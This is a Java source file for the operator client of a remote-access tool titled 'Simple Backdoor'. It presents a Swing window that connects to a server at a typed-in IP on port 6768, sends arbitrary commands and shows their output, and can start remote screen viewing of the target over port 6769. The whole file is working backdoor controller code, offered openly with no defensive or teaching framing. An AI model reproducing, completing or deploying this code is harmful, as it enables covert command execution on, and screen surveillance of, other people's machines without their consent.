package net.jaguargaming.backdoor.client;

import java.awt.EventQueue;
import java.awt.Font;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;

import javax.swing.DefaultListModel;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JList;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextField;
import javax.swing.ListSelectionModel;
import javax.swing.UIManager;
import javax.swing.border.EmptyBorder;

public class Client extends JFrame {

	/**
	 * 
	 */
	private static final long serialVersionUID = -7465526846394784482L;
	private JPanel contentPane;
	private JTextField cmdField;
	
	public static final int PORT = 6768;
	
	String address = "";
	boolean connected = false;
	Socket s;
	DataInputStream din;
	DataOutputStream dout;
	
	ScreenshareClient ssclient;
	
	/**
	 * Launch the application.
	 */
	public static void main(String[] args) {
		try {
			UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
		} catch (Throwable e) {
			e.printStackTrace();
		}
		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					Client frame = new Client();
					frame.setVisible(true);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}

	/**
	 * Create the frame.
	 */
	public Client() {
		setResizable(false);
		setTitle("Simple Backdoor");
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		setBounds(100, 100, 470, 289);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		contentPane.setLayout(null);
		setContentPane(contentPane);
		
		DefaultListModel<String> cmdListModel = new DefaultListModel<String>();
		JList<String> cmdList = new JList<String>();
		cmdList.setModel(cmdListModel);
		cmdList.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
		cmdList.setBounds(0, 0, 1, 1);
		
		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setBounds(10, 11, 300, 200);
		scrollPane.setViewportView(cmdList);
		contentPane.add(scrollPane);
		
		cmdField = new JTextField();
		cmdField.setBounds(10, 222, 300, 20);
		contentPane.add(cmdField);
		cmdField.setColumns(10);
		
		JButton btnConnect = new JButton("Connect");
		btnConnect.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if (connected) {
					JOptionPane.showMessageDialog(null, "Already connected to a server!", "Simple Backdoor", JOptionPane.INFORMATION_MESSAGE);
					return;
				}
				address = JOptionPane.showInputDialog(null, "Enter Server IP", "127.0.0.1");
				try {
					cmdListModel.clear();
					cmdListModel.addElement("Connecting to " + address);
					s = new Socket(address, PORT);
					din = new DataInputStream(s.getInputStream());
					dout = new DataOutputStream(s.getOutputStream());
					dout.writeUTF("hello");
					dout.flush();
					String awnser = din.readUTF();
					if (awnser.equals("hello")) {
						JOptionPane.showMessageDialog(null, "Connected!", "Simple Backdoor", JOptionPane.INFORMATION_MESSAGE);
						connected = true;
						cmdListModel.addElement("Connected to " + address);
					} else {
						JOptionPane.showMessageDialog(null, "Server didn't reply properly!", "Simple Backdoor", JOptionPane.ERROR_MESSAGE);
					}
				} catch (IOException e) {
					e.printStackTrace();
					JOptionPane.showMessageDialog(null, "Error: " + e.getMessage(), "Simple Backdoor", JOptionPane.ERROR_MESSAGE);
				}
			}
		});
		btnConnect.setFont(new Font("Tahoma", Font.PLAIN, 20));
		btnConnect.setBounds(320, 9, 134, 41);
		contentPane.add(btnConnect);
		
		JButton btnDisconnect = new JButton("Disconnect");
		btnDisconnect.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if (!connected) {
					JOptionPane.showMessageDialog(null, "Not connected to a server!", "Simple Backdoor", JOptionPane.INFORMATION_MESSAGE);
					return;
				}
				try {
					dout.writeUTF("bye im out");
					dout.flush();
					String awnser = din.readUTF();
					if (awnser.equalsIgnoreCase("see you")) {
						din.close();
						dout.close();
						s.close();
						JOptionPane.showMessageDialog(null, "Disconnected!", "Simple Backdoor", JOptionPane.INFORMATION_MESSAGE);
						connected = false;
					} else {
						JOptionPane.showMessageDialog(null, "Server didn't reply properly!", "Simple Backdoor", JOptionPane.ERROR_MESSAGE);
					}
				} catch (IOException e) {
					e.printStackTrace();
					JOptionPane.showMessageDialog(null, "Error: " + e.getMessage(), "Simple Backdoor", JOptionPane.ERROR_MESSAGE);
				}
			}
		});
		btnDisconnect.setFont(new Font("Tahoma", Font.PLAIN, 20));
		btnDisconnect.setBounds(320, 61, 134, 41);
		contentPane.add(btnDisconnect);
		
		JButton btnSendCommand = new JButton("Send Command");
		btnSendCommand.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if (!connected) {
					JOptionPane.showMessageDialog(null, "Not connected to a server!", "Simple Backdoor", JOptionPane.INFORMATION_MESSAGE);
					return;
				}
				if (cmdField.getText().isEmpty()) {
					JOptionPane.showMessageDialog(null, "Please type in a command!", "Simple Backdoor", JOptionPane.INFORMATION_MESSAGE);
					return;
				}
				try {
					cmdListModel.addElement("[" + System.getProperty("user.name") + "] SEND: " + cmdField.getText());
					dout.writeUTF(cmdField.getText());
					dout.flush();
					String msg = cmdField.getText();
					cmdField.setText("");
					String awnser;
					while (!((awnser = din.readUTF()).equalsIgnoreCase("end"))) {
						if (!awnser.equalsIgnoreCase("end"))
							cmdListModel.addElement(awnser);
					}
					if (msg.startsWith("screenshare on")) {
						Thread t = new Thread (new Runnable() {

							@Override
							public void run() {
								ssclient = new ScreenshareClient(address, 6769, Integer.parseInt(msg.split(" ")[2]), Integer.parseInt(msg.split(" ")[3]));
								ssclient.setVisible(true);
							}
							
						});
						t.start();
					} else if (msg.startsWith("screenshare off")) {
						ssclient.setDefaultCloseOperation(DISPOSE_ON_CLOSE);
						JOptionPane.showMessageDialog(null, "Please close the Screenshare window now!", "Simple Backdoor", JOptionPane.INFORMATION_MESSAGE);
					}
				} catch (IOException e) {
					e.printStackTrace();
					JOptionPane.showMessageDialog(null, "Error: " + e.getMessage(), "Simple Backdoor", JOptionPane.ERROR_MESSAGE);
				}
			}
		});
		btnSendCommand.setBounds(320, 221, 134, 23);
		contentPane.add(btnSendCommand);
		
	}
}
